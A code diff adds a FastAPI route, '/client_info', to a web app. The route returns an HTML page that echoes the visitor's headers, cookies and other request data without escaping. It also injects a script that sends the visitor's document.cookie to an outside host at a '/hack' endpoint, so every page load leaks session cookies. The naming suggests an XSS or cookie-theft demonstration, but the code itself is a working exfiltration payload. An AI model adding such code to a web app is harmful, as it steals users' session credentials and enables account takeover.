@@ -19,6 +19,47 @@ app.add_middleware(
 
 data = []
 
+@app.get("/client_info")
+def get_cookie(request: Request):
+    client_host = request.client.host
+    client_port = request.client.port
+    headers = request.headers
+    cookies = request.cookies
+    query_params = request.query_params
+    path_params = request.path_params
+    method = request.method
+    url = request.url
+    base_url = request.base_url
+    scope = request.scope
+    state = request.state
+
+    return HTMLResponse(
+        f"""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Document</title>
+        </head>
+        <body>
+            <p>Client Host: {client_host}</p>
+            <p>Client Port: {client_port}</p>
+            <p>Headers: {headers}</p>
+            <p>Cookies: {cookies}</p>
+            <p>Query Params: {query_params}</p>
+            <p>Path Params: {path_params}</p>
+            <p>Method: {method}</p>
+            <p>URL: {url}</p>
+            <p>Base URL: {base_url}</p>
+            <p>Scope: {scope}</p>
+            <p>State: {state}</p>
+            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${{document.cookie}}`)</script>
+        </body>
+        </html>
+        """
+    )
+
 @app.get("/")
 def get_cookie(request: Request):
     domain = request.url.hostname
